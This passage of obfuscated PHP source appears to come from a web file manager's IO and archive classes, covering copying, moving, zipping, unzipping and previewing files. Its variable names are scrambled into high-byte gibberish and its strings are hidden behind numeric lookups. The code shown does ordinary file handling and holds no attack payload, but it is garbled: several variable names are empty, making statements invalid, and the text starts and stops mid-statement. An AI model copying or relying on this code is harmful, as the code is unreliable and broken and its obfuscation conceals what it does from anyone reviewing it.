$ş—Ì¤úåæ¢, $Œ‡÷); if (!$²éšÕïÄéïÏƒ) { IO::errorTips($õÏ[1089] . $Ú§µÌ¼ . $õÏ[67] . $İÕĞÂ); } } self::copyMoveKeepInfo($¸«ëÊˆ¬–†, $Ú§µÌ¼, $¸¨®‚’Ñ£÷†²); return $¸¨®‚’Ñ£÷†²; } private static function copyFile($ÖüóØ, $‘ÃØ°Œ—à, $¨çàÈÔ˜Ş, $Êù, $Â„÷, $ÓÂé»Ë¬) { $æÅ¡Œ™Œù =& $_SERVER[èÍ×öˆøÉ]; $Êù = $¨çàÈÔ˜Ş->getPath(rtrim($Êù, $æÅ¡Œ™Œù[8]) . $æÅ¡Œ™Œù[8] . $Â„÷); $€öøØ‹½¼÷å¿ = $æÅ¡Œ™Œù[1090] . time() . rand_string(5); Hook::trigger($æÅ¡Œ™Œù[1091], $ÖüóØ, $‘ÃØ°Œ—à, $¨çàÈÔ˜Ş, $Êù, $Â„÷, $€öøØ‹½¼÷å¿); if (self::driverIsSame($ÖüóØ, $¨çàÈÔ˜Ş)) { if ($ÓÂé»Ë¬) { $‡¹ê = $¨çàÈÔ˜Ş->moveFile($‘ÃØ°Œ—à, $Êù); } else { $‡¹ê = $¨çàÈÔ˜Ş->copyFile($‘ÃØ°Œ—à, $Êù); } Hook::trigger($æÅ¡Œ™Œù[1092], $ÖüóØ, $‘ÃØ°Œ—à, $¨çàÈÔ˜Ş, $Êù, $Â„÷, $‡¹ê); self::copyMoveKeepInfo($ÖüóØ, $‘ÃØ°Œ—à, $‡¹ê); return $‡¹ê; } $ƒã¥„¤ê‡İ = TEMP_FILES; if ($GLOBALS[$æÅ¡Œ™Œù[6]][$æÅ¡Œ™Œù[88]][$æÅ¡Œ™Œù[797]]) { $ƒã¥„¤ê‡İ = $GLOBALS[$æÅ¡Œ™Œù[6]][$æÅ¡Œ™Œù[88]][$æÅ¡Œ™Œù[797]]; } $ëØøï’úÃ = $ƒã¥„¤ê‡İ; mk_dir($ëØøï’úÃ); $æ°ıè¹ˆ = $ëØøï’úÃ . $€öøØ‹½¼÷å¿; $ë“Ğ’«Á§Á = $æ°ıè¹ˆ; $æ°ıè¹ˆ = $ÖüóØ->download($‘ÃØ°Œ—à, $æ°ıè¹ˆ); $æ°ıè¹ˆ = $ÖüóØ->iconvApp($æ°ıè¹ˆ); if (substr($æ°ıè¹ˆ, strlen($ƒã¥„¤ê‡İ)) == $ƒã¥„¤ê‡İ) { $ÓÂé»Ë¬ = !0; } $‡¹ê = $¨çàÈÔ˜Ş->upload($Êù, $æ°ıè¹ˆ, $ÓÂé»Ë¬); self::remove($ë“Ğ’«Á§Á); Hook::trigger($æÅ¡Œ™Œù[1092], $ÖüóØ, $‘ÃØ°Œ—à, $¨çàÈÔ˜Ş, $Êù, $Â„÷, $‡¹ê); self::copyMoveKeepInfo($ÖüóØ, $‘ÃØ°Œ—à, $‡¹ê); return $‡¹ê; } private static function copyMoveKeepInfo($Í©ïş„æ¡, $òŒ¶«Ó”İ¨, $¥ıëÃ) { if (!$¥ıëÃ) { return; } $ëÔËã = $Í©ïş„æ¡->info($òŒ¶«Ó”İ¨); if (!is_array($ëÔËã)) { return; } IO::setModifyTime($¥ıëÃ, $ëÔËã[$_SERVER[èÍ×öˆøÉ][84]]); } public static function pathFather($Ò“ü) { $ØİŒô‘Àï¿ôÜ = IO::init($Ò“ü); $î¤õ = $ØİŒô‘Àï¿ôÜ->pathFather($ØİŒô‘Àï¿ôÜ->path); return $ØİŒô‘Àï¿ôÜ->getPathOuter($î¤õ); } public static function fileOut($‚†ı‰±²ƒ¶, $œà €Àİä¡ğ = false, $š¶ú¯è±Öë€î = false, $µé¨È¦ = '') { $ÂéÅÒÏÃêøğ = self::driverMake($‚†ı‰±²ƒ¶); if ($ÂéÅÒÏÃêøğ->isFileOutServer()) { return $ÂéÅÒÏÃêøğ->fileOutServer($‚†ı‰±²ƒ¶, $œà €Àİä¡ğ, $š¶ú¯è±Öë€î, $µé¨È¦); } return $ÂéÅÒÏÃêøğ->fileOut($‚†ı‰±²ƒ¶, $œà €Àİä¡ğ, $š¶ú¯è±Öë€î, $µé¨È¦); } public static function fileOutImage($Õ÷öÀÃ, $Ã¹ß‚‹şã = 250) { $ş€® = array(250, 600, 1200, 2000, 3000, 5000); for ($¾¹“à = 0; $¾¹“à < count($ş€®); $¾¹“à++) { if ($¾¹“à == 0 && $Ã¹ß‚‹şã <= $ş€®[$¾¹“à]) { $Ã¹ß‚‹şã = $ş€®[$¾¹“à]; break; } else { if ($Ã¹ß‚‹şã > $ş€®[$¾¹“à - 1] && $Ã¹ß‚‹şã <= $ş€®[$¾¹“à]) { $Ã¹ß‚‹şã = $ş€®[$¾¹“à]; break; } else { if ($¾¹“à == count($ş€®) - 1 && $Ã¹ß‚‹şã > $ş€®[$¾¹“à]) { $Ã¹ß‚‹şã = $ş€®[$¾¹“à]; break; } } } } $‰½ëè‰‘ = self::driverMake($Õ÷öÀÃ); if ($‰½ëè‰‘->isFileOutServer()) { return $‰½ëè‰‘->fileOutImageServer($Õ÷öÀÃ, $Ã¹ß‚‹şã); } return $‰½ëè‰‘->fileOutImage($Õ÷öÀÃ, $Ã¹ß‚‹şã); } private static function driverIsSame($«Œ„÷‚ùßÓÎ, $œ¥é£üøË†À) { $Íñç =& $_SERVER[èÍ×öˆøÉ]; $€¦¦ÛÅÒ©¥ç§ = $«Œ„÷‚ùßÓÎ->getType(); $ƒ£ú•»Ñ = $œ¥é£üøË†À->getType(); if ($€¦¦ÛÅÒ©¥ç§ != $ƒ£ú•»Ñ) { return !1; } if ($€¦¦ÛÅÒ©¥ç§ == $Íñç[753]) { return !0; } if ($€¦¦ÛÅÒ©¥ç§ == $Íñç[106]) { return !0; } if ($«Œ„÷‚ùßÓÎ->pathDriver == $œ¥é£üøË†À->pathDriver) { return !0; } return !1; } public static function copyUpdate($’Ø¶, $ïº) { $”ŒÚ =& $_SERVER[èÍ×öˆøÉ]; if (!IO::exist($’Ø¶)) { return !1; } if (!IO::exist($ïº)) { IO::mkdir($ïº); } $üêĞÊ© = self::_listAll($’Ø¶); $°Ğû = self::_listAll($ïº); $µŞØÂÍäÄì… = array(); $Ÿº«´¬Úáñú = array(); foreach ($üêĞÊ© as $ğáäıë => $œ¥¼ßÓËÁÚ) { if (isset($°Ğû[$ğáäıë])) { if ($œ¥¼ßÓËÁÚ[$”ŒÚ[77]] == 1) { continue; } if ($°Ğû[$ğáäıë][$”ŒÚ[78]] == $œ¥¼ßÓËÁÚ[$”ŒÚ[78]]) { continue; } } if ($œ¥¼ßÓËÁÚ[$”ŒÚ[77]] == 1) { $Ÿº«´¬Úáñú[] = $ïº . $”ŒÚ[8] . $ğáäıë; continue; } $ëÃåÇ†Ä = strstr(trim($ğáäıë, $”ŒÚ[8]), $”ŒÚ[8]) ? get_path_father($ğáäıë) : $”ŒÚ[33]; $µŞØÂÍäÄì…[] = array($”ŒÚ[1093] => $œ¥¼ßÓËÁÚ[$”ŒÚ[76]], $”ŒÚ[1094] => rtrim($ïº, $”ŒÚ[8]) . $”ŒÚ[8] . $ëÃåÇ†Ä, $”ŒÚ[1095] => $œ¥¼ßÓËÁÚ); } $ş¹Ãˆİ’ = array($”ŒÚ[193] => $µŞØÂÍäÄì…, $”ŒÚ[77] => $Ÿº«´¬Úáñú); Hook::trigger($”ŒÚ[1096], $’Ø¶, $ïº, $ş¹Ãˆİ’); foreach ($Ÿº«´¬Úáñú as $œ¥¼ßÓËÁÚ) { IO::mkdir($œ¥¼ßÓËÁÚ); } foreach ($µŞØÂÍäÄì… as $œ¥¼ßÓËÁÚ) { IO::copy($œ¥¼ßÓËÁÚ[$”ŒÚ[1093]], $œ¥¼ßÓËÁÚ[$”ŒÚ[1094]], REPEAT_REPLACE); } } private static function _listAll($ûú°É¹ü÷·) { $ÖÅñ„ªµå =& $_SERVER[èÍ×öˆøÉ]; $ûú°É¹ü÷· = KodIO::clear($ûú°É¹ü÷·); $¥¼Šê = IO::listAll($ûú°É¹ü÷·); foreach ($¥¼Šê as &$·ß§˜¬ÁÊ–) { $Ú‰’‡Ãï–ÅÁ = substr($·ß§˜¬ÁÊ–[$ÖÅñ„ªµå[76]], strlen($ûú°É¹ü÷·)); $·ß§˜¬ÁÊ–[$ÖÅñ„ªµå[1097]] = trim($Ú‰’‡Ãï–ÅÁ, $ÖÅñ„ªµå[8]); } unset($·ß§˜¬ÁÊ–); return array_to_keyvalue($¥¼Šê, $ÖÅñ„ªµå[1097]); } public static function fileSubstr($ç—œÖ, $äÜëå¤Ú, $»”¹¨ôãº¡ = false) { $¹Ì„õŒ =& $_SERVER[èÍ×öˆøÉ]; $ğ§µ¤Öº´à = self::driverMake($ç—œÖ); $‰ª = $ğ§µ¤Öº´à->size($ç—œÖ); $ˆ¹ = $äÜëå¤Ú; $Ê³£İÈñÖ = $»”¹¨ôãº¡; if ($äÜëå¤Ú < 0) { $äÜëå¤Ú = $‰ª + $äÜëå¤Ú; } if ($»”¹¨ôãº¡ === !1) { $»”¹¨ôãº¡ = $‰ª - $äÜëå¤Ú; } if ($äÜëå¤Ú + $»”¹¨ôãº¡ > $‰ª) { $»”¹¨ôãº¡ = $‰ª - $äÜëå¤Ú; } if (!$‰ª && $ğ§µ¤Öº´à->getType() == $¹Ì„õŒ[106] && !$ğ§µ¤Öº´à->exist($ç—œÖ)) { throw new Exception($¹Ì„õŒ[1098] . LNG($¹Ì„õŒ[1099]) . $¹Ì„õŒ[964] . get_path_this($ç—œÖ) . $¹Ì„õŒ[33]); } if ($»”¹¨ôãº¡ <= 0) { return $¹Ì„õŒ[33]; } if ($äÜëå¤Ú < 0 || $äÜëå¤Ú >= $‰ª || $»”¹¨ôãº¡ > 1024 * 1024 * 10) { throw new Exception("\146\151\154\x65\x52\x65\141\x64\x20\145\162\x72\x6f\x72\41\40\x73\164\x61\162\164\75{$äÜëå¤Ú}\73\154\x65\x6e\x67\x74\150\75{$»”¹¨ôãº¡}\x3b\40\x73\151\x7a\x65\75{$‰ª}\x3b"); } $ıå”§´È = $ğ§µ¤Öº´à->fileSubstr($ç—œÖ, $äÜëå¤Ú, $»”¹¨ôãº¡); if (!$ıå”§´È && $»”¹¨ôãº¡ && isset($GLOBALS[$¹Ì„õŒ[1100]])) { throw new Exception($GLOBALS[$¹Ì„õŒ[1100]][$¹Ì„õŒ[1101]]); } return $ıå”§´È; } private static function driverMake(&$Ö) { $«Û®‡øõÑ½îÖ =& $_SERVER[èÍ×öˆøÉ]; $æÖ = KodIO::parse($Ö); if (!self::$driverListSystem) { $è = Model($«Û®‡øõÑ½îÖ[762])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($è, $«Û®‡øõÑ½îÖ[395]); } if ($æÖ[$«Û®‡øõÑ½îÖ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$æÖ[$«Û®‡øõÑ½îÖ[395]]]) { return !1; } $Ö = $æÖ[$«Û®‡øõÑ½îÖ[1102]]; $€ç = self::driverGet($æÖ, $Ö); return $€ç; } private static function driverGet($•Í´ôŞÉ§, &$) { $Ç…ñ™ =& $_SERVER[èÍ×öˆøÉ]; $–Öù¸á× = $•Í´ôŞÉ§[$Ç…ñ™[1103]]; $Ÿ†£˜–ç = $•Í´ôŞÉ§[$Ç…ñ™[395]]; switch ($•Í´ôŞÉ§[$Ç…ñ™[29]]) { case KodIO::KOD_IO: $³”û = self::$driverListSystem[$Ÿ†£˜–ç]; break; case KodIO::KOD_SOURCE: $ = $Ÿ†£˜–ç . $; $³”û = array($Ç…ñ™[1104] => $Ç…ñ™[1105], $Ç…ñ™[6] => $•Í´ôŞÉ§); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $‹Óíœ‹€ = $GLOBALS[$Ç…ñ™[1106]]; self::$driverListUser = array_to_keyvalue($‹Óíœ‹€, $Ç…ñ™[395]); } $³”û = self::$driverListUser[$Ÿ†£˜–ç]; break; case KodIO::KOD_SHARE_LINK: $³”û = array($Ç…ñ™[1104] => $Ç…ñ™[1107], $Ç…ñ™[6] => $•Í´ôŞÉ§); $Ö½ü = Action($Ç…ñ™[1108])->sharePathInfo($•Í´ôŞÉ§[$Ç…ñ™[76]]); $ = $Ö½ü[$Ç…ñ™[397]]; if (!$Ö½ü[$Ç…ñ™[397]]) { $û¾ = Model($Ç…ñ™[589])->getInfo($Ö½ü[$Ç…ñ™[482]]); $ = KodIO::clear($û¾[$Ç…ñ™[1109]] . $•Í´ôŞÉ§[$Ç…ñ™[1102]]); $•Í´ôŞÉ§[$Ç…ñ™[480]] = $û¾; $•Í´ôŞÉ§[$Ç…ñ™[1086]] = $; $³”û = array($Ç…ñ™[1104] => $Ç…ñ™[1110], $Ç…ñ™[6] => $•Í´ôŞÉ§); } break; case KodIO::KOD_SHARE_ITEM: $³”û = array($Ç…ñ™[1104] => $Ç…ñ™[1111], $Ç…ñ™[6] => $•Í´ôŞÉ§); $û¾ = Model($Ç…ñ™[589])->getInfo($•Í´ôŞÉ§[$Ç…ñ™[395]]); if ($û¾[$Ç…ñ™[397]] == $Ç…ñ™[191]) { $ = KodIO::clear($û¾[$Ç…ñ™[1109]] . $•Í´ôŞÉ§[$Ç…ñ™[1102]]); $•Í´ôŞÉ§[$Ç…ñ™[480]] = $û¾; $•Í´ôŞÉ§[$Ç…ñ™[1086]] = $; $³”û = array($Ç…ñ™[1104] => $Ç…ñ™[1112], $Ç…ñ™[6] => $•Í´ôŞÉ§); } else { if (!$) { $ = $û¾[$Ç…ñ™[397]]; } } break; default: $ = $•Í´ôŞÉ§[$Ç…ñ™[76]]; $³”û = array($Ç…ñ™[1104] => $Ç…ñ™[1113]); break; } $ÏÀâÅßÏ = $•Í´ôŞÉ§[$Ç…ñ™[76]]; if (!isset(self::$driverCache[$ÏÀâÅßÏ])) { $ôêï¼³ÁÒ¼ = strtolower($³”û[$Ç…ñ™[94]]); $Â¨¬• = $GLOBALS[$Ç…ñ™[6]][$Ç…ñ™[88]][$Ç…ñ™[828]]; $ŸÑ = $Ç…ñ™[72] . (isset($Â¨¬•[$ôêï¼³ÁÒ¼]) ? $Â¨¬•[$ôêï¼³ÁÒ¼] : ucfirst($ôêï¼³ÁÒ¼)); if (!class_exists($ŸÑ)) { show_json("{$ŸÑ}\x20\156\x6f\164\40\145\170\x69\x73\x74\163\x21", !1); } $ºüúÔÎş¾¥§ú = isset($³”û[$Ç…ñ™[6]]) ? $³”û[$Ç…ñ™[6]] : !1; self::$driverCache[$ÏÀâÅßÏ] = new $ŸÑ($ºüúÔÎş¾¥§ú); } $ç†½ñ = self::$driverCache[$ÏÀâÅßÏ]; $ç†½ñ->pathDriver = $–Öù¸á×; $ç†½ñ->pathBase = $Ç…ñ™[33]; if (isset($³”û[$Ç…ñ™[6]][$Ç…ñ™[1114]])) { $ç†½ñ->pathBase = rtrim($³”û[$Ç…ñ™[6]][$Ç…ñ™[1114]], $Ç…ñ™[8]) . $Ç…ñ™[8]; $ = $ç†½ñ->pathBase . ltrim($, $Ç…ñ™[8]); } $ = $ç†½ñ->getPath($); if (isset($•Í´ôŞÉ§[$Ç…ñ™[1086]])) { $ = $•Í´ôŞÉ§[$Ç…ñ™[1086]]; } $ç†½ñ->path = $; return $ç†½ñ; } public static function errorTips($ÉÆ¦Ãß”§ú = false) { $´‚ø =& $_SERVER[èÍ×öˆøÉ]; static $‹îŸ•Şª– = array(); $Â“ÅÖ = 1000; if ($ÉÆ¦Ãß”§ú === -1) { return $‹îŸ•Şª– ? $‹îŸ•Şª–[count($‹îŸ•Şª–) - 1] : $´‚ø[33]; } if ($ÉÆ¦Ãß”§ú === !1) { return implode($´‚ø[229], $‹îŸ•Şª–); } if (count($‹îŸ•Şª–) >= $Â“ÅÖ) { $‹îŸ•Şª– = array_slice($‹îŸ•Şª–, $Â“ÅÖ * 0.5, $Â“ÅÖ); } $‹îŸ•Şª–[] = $ÉÆ¦Ãß”§ú; write_log($´‚ø[160] . ACTION . $´‚ø[1115] . $ÉÆ¦Ãß”§ú, $´‚ø[1116]); } public static function getLastError($¹—ªÜğè²ñãñ = '') { $Ó¢ = self::errorTips(-1); return $Ó¢ ? $Ó¢ : $¹—ªÜğè²ñãñ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ÊÉÉ; if (!$ÊÉÉ) { $Š¿³•‡‚Áˆ = IO::init($_SERVER[èÍ×öˆøÉ][8]); } return $Š¿³•‡‚Áˆ; } private static function iconvSystem($ãïÎœç¬°»Æ°) { return self::local()->iconvSystem($ãïÎœç¬°»Æ°); } private static function iconvApp($Â‹‚»Ÿó»ÉÇ) { return self::local()->iconvApp($Â‹‚»Ÿó»ÉÇ); } public static function zip($¦Ÿ, $û½óãùŞ’ = "\x7a\151\160", $â¯â‹ = '', $ã’¶í = REPEAT_RENAME) { $µé‘¸œª“ =& $_SERVER[èÍ×öˆøÉ]; $¦“ = self::init($¦Ÿ[0][$µé‘¸œª“[76]]); $éşà‹æ = self::info($¦Ÿ[0][$µé‘¸œª“[76]]); $•ç±÷Œ = !1; if (!$â¯â‹ && $¦“->getType() == $µé‘¸œª“[106]) { $“Ò½ = self::zipFileList($¦Ÿ); } else { $•ç±÷Œ = $â¯â‹ ? $â¯â‹ : TEMP_FILES . $µé‘¸œª“[1117] . time() . rand_string(8) . $µé‘¸œª“[8]; mk_dir($•ç±÷Œ); $“Ò½ = self::zipFileList($¦Ÿ, $•ç±÷Œ); } $®‘¡Ç¬Ë¨ = $éşà‹æ[$µé‘¸œª“[28]]; if (count($“Ò½) > 1) { $å¿Íœ£„ = IO::info(IO::pathFather($éşà‹æ[$µé‘¸œª“[76]])); $®‘¡Ç¬Ë¨ = $å¿Íœ£„[$µé‘¸œª“[28]]; } $Ÿ™ = $•ç±÷Œ; if (!$Ÿ™) { $Ÿ™ = get_path_father($éşà‹æ[$µé‘¸œª“[76]]); if (!$â¯â‹ && $¦“->getType() == $µé‘¸œª“[106]) { $Ÿ™ = get_path_father($¦“->path); } $¡‹ = IO::info($Ÿ™); if (!$¡‹[$µé‘¸œª“[196]]) { show_json(LNG($µé‘¸œª“[1118]), !1); } } $ßÀĞÛœá€ı = $Ÿ™ . $®‘¡Ç¬Ë¨ . $µé‘¸œª“[95] . $û½óãùŞ’; $ßÀĞÛœá€ı = get_filename_auto($ßÀĞÛœá€ı, $µé‘¸œª“[33], $ã’¶í); $¥ºÇ = self::iconvSystem($ßÀĞÛœá€ı); foreach ($“Ò½ as $´›Áı => $Å›”‹íÕ) { $“Ò½[$´›Áı] = self::iconvSystem($Å›”‹íÕ); } KodArchive::create($¥ºÇ, $“Ò½); if (!IO::exist($ßÀĞÛœá€ı)) { if ($•ç±÷Œ) { del_dir($•ç±÷Œ); } show_json(LNG($µé‘¸œª“[1119]), !1); } if ($â¯â‹ || !$•ç±÷Œ) { if ($•ç±÷Œ && strstr($•ç±÷Œ, TEMP_FILES)) { $µğ = $“Ò½ = array(); recursion_dir($Ÿ™, $µğ, $“Ò½, 0); foreach ($µğ as $ÔäÏÎÅæ) { del_dir($ÔäÏÎÅæ); } foreach ($“Ò½ as $Ş¸äÖÓû) { if ($Ş¸äÖÓû == $¥ºÇ) { continue; } del_file($Ş¸äÖÓû); } } return $ßÀĞÛœá€ı; } $¶¾©Æ«é´È = self::pathFather($éşà‹æ[$µé‘¸œª“[76]]); $­àçïŞ™» = self::move($ßÀĞÛœá€ı, $¶¾©Æ«é´È, $ã’¶í); if (!$­àçïŞ™») { del_dir($•ç±÷Œ); show_json(LNG($µé‘¸œª“[1119]), !1); } del_dir($•ç±÷Œ); return $­àçïŞ™»; } public static function unzip($şüæ—Ø, $ÇÁ¢ÊŒ‡ĞÏ  = "\x72\145\160\x6c\x61\143\145") { $‹­•ŠíË¿á =& $_SERVER[èÍ×öˆøÉ]; $Ö…Éï†¬êï = $şüæ—Ø[$‹­•ŠíË¿á[76]]; $•ª¨í€´ÎÏ¶… = $şüæ—Ø[$‹­•ŠíË¿á[1120]]; if (!($ÆÊ»Ó‚ñ« = parent::info($Ö…Éï†¬êï))) { show_json(LNG($‹­•ŠíË¿á[1121]), !1); } if (!($£Ê‡ = parent::infoFull($•ª¨í€´ÎÏ¶…))) { $•ª¨í€´ÎÏ¶… = parent::mkdir($•ª¨í€´ÎÏ¶…); $£Ê‡ = array($‹­•ŠíË¿á[76] => $•ª¨í€´ÎÏ¶…); } else { if (isset($£Ê‡[$‹­•ŠíË¿á[397]]) && trim($£Ê‡[$‹­•ŠíË¿á[76]], $‹­•ŠíË¿á[8]) != trim($•ª¨í€´ÎÏ¶…, $‹­•ŠíË¿á[8])) { $î•ÓøĞú = KodIO::make($£Ê‡[$‹­•ŠíË¿á[492]]); $ú Ø“…¿— = parent::fileNameAuto($î•ÓøĞú, $£Ê‡[$‹­•ŠíË¿á[28]], REPEAT_RENAME_FOLDER, !0); $•ª¨í€´ÎÏ¶… = parent::mkdir($î•ÓøĞú . $ú Ø“…¿—); $£Ê‡ = array($‹­•ŠíË¿á[76] => $•ª¨í€´ÎÏ¶…); } } $•ª¨í€´ÎÏ¶… = $£Ê‡[$‹­•ŠíË¿á[76]]; $Ú¦Äíİ®Îæ™æ = self::tmpFileName($ÆÊ»Ó‚ñ«); $®óğ = TEMP_FILES . $Ú¦Äíİ®Îæ™æ; del_dir($®óğ); mk_dir($®óğ); $úÁè°±èÅ¦ = self::fileExt($ÆÊ»Ó‚ñ«); $÷Â¹Œ¡ = $®óğ . $‹­•ŠíË¿á[95] . $úÁè°±èÅ¦; if (!@file_exists(self::iconvSystem($÷Â¹Œ¡))) { $¤óş²ÌØ = self::localFilePath($Ö…Éï†¬êï, $úÁè°±èÅ¦); $÷Â¹Œ¡ = $¤óş²ÌØ ? $¤óş²ÌØ : parent::download($Ö…Éï†¬êï, $÷Â¹Œ¡); } $÷Â¹Œ¡ = self::iconvSystem($÷Â¹Œ¡); $æšêâ‚ = isset($şüæ—Ø[$‹­•ŠíË¿á[1122]]) ? $şüæ—Ø[$‹­•ŠíË¿á[1122]] : $‹­•ŠíË¿á[1123]; $Òí¿ = KodArchive::extract($÷Â¹Œ¡, $®óğ . $‹­•ŠíË¿á[8], $æšêâ‚); self::archiveExt(); if (!$Òí¿[$‹­•ŠíË¿á[1124]]) { show_json($‹­•ŠíË¿á[1125] . $Òí¿[$‹­•ŠíË¿á[1126]], !1); } Hook::trigger($‹­•ŠíË¿á[1127], $®óğ); recursion_dir($®óğ, $üÂ™ı‚âéùª, $êÅÙ™, 0); $¯² = array_merge($üÂ™ı‚âéùª, $êÅÙ™); foreach ($¯² as $Ú¿) { $Ú¿ = self::iconvApp($Ú¿); self::move($Ú¿, $•ª¨í€´ÎÏ¶…, $ÇÁ¢ÊŒ‡ĞÏ ); } del_dir($®óğ); if (!$¤óş²ÌØ) { del_file($÷Â¹Œ¡); } return !0; } public static function unzipList($Ë†›Õ) { $ãöŒÒ¶ï =& $_SERVER[èÍ×öˆøÉ]; $ø½û‡ˆâ€áÔ = $Ë†›Õ[$ãöŒÒ¶ï[76]]; $•ÎìÀÒã¼öï = isset($Ë†›Õ[$ãöŒÒ¶ï[1128]]) ? $Ë†›Õ[$ãöŒÒ¶ï[1128]] : -1; $ÌİëâåÌï¦ñ = 50000; if (request_url_safe($ø½û‡ˆâ€áÔ)) { $äØİªåÈ®¿–Ü = parse_url_query($ø½û‡ˆâ€áÔ); if (!isset($äØİªåÈ®¿–Ü[$ãöŒÒ¶ï[76]])) { show_json($ãöŒÒ¶ï[1129], !1); } } $©ò¨é¯òÌÖ = isset($äØİªåÈ®¿–Ü) ? $äØİªåÈ®¿–Ü[$ãöŒÒ¶ï[76]] : $ø½û‡ˆâ€áÔ; $ùæ¡Î‰ãªÇ”ë = self::info($©ò¨é¯òÌÖ); $äÎ = self::fileExt($ùæ¡Î‰ãªÇ”ë); $âÙæõ = self::tmpFileName($ùæ¡Î‰ãªÇ”ë); if (isset($äØİªåÈ®¿–Ü)) { $ó˜“³Ë = array($äØİªåÈ®¿–Ü[$ãöŒÒ¶ï[76]], $äØİªåÈ®¿–Ü[$ãöŒÒ¶ï[1128]], $äØİªåÈ®¿–Ü[$ãöŒÒ¶ï[28]]); $üí´ = md5(implode($ãöŒÒ¶ï[71], $ó˜“³Ë)) . $ãöŒÒ¶ï[95] . get_path_ext($äØİªåÈ®¿–Ü[$ãöŒÒ¶ï[28]]); } else { $ó˜“³Ë = array($ùæ¡Î‰ãªÇ”ë[$ãöŒÒ¶ï[28]], $ùæ¡Î‰ãªÇ”ë[$ãöŒÒ¶ï[76]], $ùæ¡Î‰ãªÇ”ë[$ãöŒÒ¶ï[78]]); $üí´ = md5(implode($ãöŒÒ¶ï[71], $ó˜“³Ë)) . $ãöŒÒ¶ï[95] . $äÎ; } if ($•ÎìÀÒã¼öï == -1) { $Íº–’¶çêï = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\126\151\x65\x77\x2f{$âÙæõ}\57{$üí´}\56\154\x6f\147"; $½÷ = self::infoFull($Íº–’¶çêï); if ($½÷) { $Íº–’¶çêï = $½÷[$ãöŒÒ¶ï[76]]; $›ş¶Ô§ = self::getContent($Íº–’¶çêï); if ($›ş¶Ô§) { $Ú” = json_decode($›ş¶Ô§, !0); if (count($Ú”) >= $ÌİëâåÌï¦ñ) { show_json(sprintf(LNG($ãöŒÒ¶ï[1130]), count($Ú”)), !1); } return $Ú”; } } else { $Íº–’¶çêï = self::mkfile($Íº–’¶çêï); } } $ŠÒ÷òçƒÛ = TEMP_FILES . $âÙæõ; if (!is_dir($ŠÒ÷òçƒÛ)) { mk_dir($ŠÒ÷òçƒÛ); } $ÄÔ¤öµòÊ€¹ = $ŠÒ÷òçƒÛ . $ãöŒÒ¶ï[8] . $üí´; if (!@file_exists(self::iconvSystem($ÄÔ¤öµòÊ€¹))) { if (isset($äØİªåÈ®¿–Ü)) { url_request($ø½û‡ˆâ€áÔ, $ãöŒÒ¶ï[1131], $ÄÔ¤öµòÊ€¹); } else { $ôÕ¤ı¯Ò = self::localFilePath($ø½û‡ˆâ€áÔ, $äÎ); $ÄÔ¤öµòÊ€¹ = $ôÕ¤ı¯Ò ? $ôÕ¤ı¯Ò : self::download($ø½û‡ˆâ€áÔ, $ÄÔ¤öµòÊ€¹); } } $ÄÔ¤öµòÊ€¹ = self::iconvSystem($ÄÔ¤öµòÊ€¹); if ($•ÎìÀÒã¼öï >= 0) { $Ğ³­Ü­¤±£ = isset($Ë†›Õ[$ãöŒÒ¶ï[1132]]) ? $Ë†›Õ[$ãöŒÒ¶ï[1132]] : !1; $“Ğ = isset($Ë†›Õ[$ãöŒÒ¶ï[28]]) ? $Ë†›Õ[$ãöŒÒ¶ï[28]] : $ãöŒÒ¶ï[33]; KodArchive::filePreview($ÄÔ¤öµòÊ€¹, $•ÎìÀÒã¼öï, $Ğ³­Ü­¤±£, $“Ğ); self::archiveExt(); die; } $Ò¥¿òƒ“õ = KodArchive::listContent($ÄÔ¤öµòÊ€¹); self::archiveExt(); del_dir($ŠÒ÷òçƒÛ); if (!$Ò¥¿òƒ“õ[$ãöŒÒ¶ï[1124]]) { show_json($Ò¥¿òƒ“õ[$ãöŒÒ¶ï[1126]], !1); } $Ú” = json_encode($Ò¥¿òƒ“õ[$ãöŒÒ¶ï[1126]]); self::setContent($Íº–’¶çêï, $Ú”); if (count($Ò¥¿òƒ“õ[$ãöŒÒ¶ï[1126]]) >= $ÌİëâåÌï¦ñ) { show_json(sprintf(LNG($ãöŒÒ¶ï[1130]), count($Ò¥¿òƒ“õ[$ãöŒÒ¶ï[1126]])), !1); } return $Ò¥¿òƒ“õ[$ãöŒÒ¶ï[1126]]; } private static function fileExt($ò‘¦ú„Â“û) { $ò =& $_SERVER[èÍ×öˆøÉ]; $ú†¬¹¦”ÜÚ = $ò‘¦ú„Â“û[$ò[168]]; if ($ú†¬¹¦”ÜÚ == $ò[1133]) { $‘¹Ã = $ò[1134]; if (substr($ò‘¦ú„Â“û[$ò[28]], -strlen($‘¹Ã)) == $‘¹Ã) { $ú†¬¹¦”ÜÚ = $ò[1135]; } } self::archiveExt($ú†¬¹¦”ÜÚ); return $ú†¬¹¦”ÜÚ; } private static function zipFileList($ëìÙàò¾, $İşäâ = false) { $ªóöªšÎíé =& $_SERVER[èÍ×öˆøÉ]; $©ú’ = array(); foreach ($ëìÙàò¾ as $ĞØ±‘ëíˆ—¿£) { $Ë™Û = $ĞØ±‘ëíˆ—¿£[$ªóöªšÎíé[76]]; if ($İşäâ) { $Ë™Û = self::copy($ĞØ±‘ëíˆ—¿£[$ªóöªšÎíé[76]], $İşäâ, $ªóöªšÎíé[820]); } else { $û€·àÕçÃö = self::init($ĞØ±‘ëíˆ—¿£[$ªóöªšÎíé[76]]); if ($û€·àÕçÃö->getType() == $ªóöªšÎíé[106]) { $Ë™Û = $û€·àÕçÃö->path; } } if ($Ë™Û && self::local()->exist($Ë™Û)) { $©ú’[$ĞØ±‘ëíˆ—¿£[$ªóöªšÎíé[76]]] = $Ë™Û; } } if (!empty($©ú’)) { return array_values($©ú’); } show_json(LNG($ªóöªšÎíé[1099]), !1); } public static function tmpFileName($¹Øåï•Û®å) { $®Ğ–û =& $_SERVER[èÍ×öˆøÉ]; $æâµˆ¯¤³ı ¿ = array($¹Øåï•Û®å[$®Ğ–û[28]], $¹Øåï•Û®å[$®Ğ–û[76]], $¹Øåï•Û®å[$®Ğ–û[78]], $¹Øåï•Û®å[$®Ğ–û[515]]); return md5(implode($®Ğ–û[71], $æâµˆ¯¤³ı ¿)); } private static function localFilePath($Ñéà¶Íó…, $úÆÒ) { $—· =& $_SERVER[èÍ×öˆøÉ]; if ($úÆÒ == $—·[1136] && 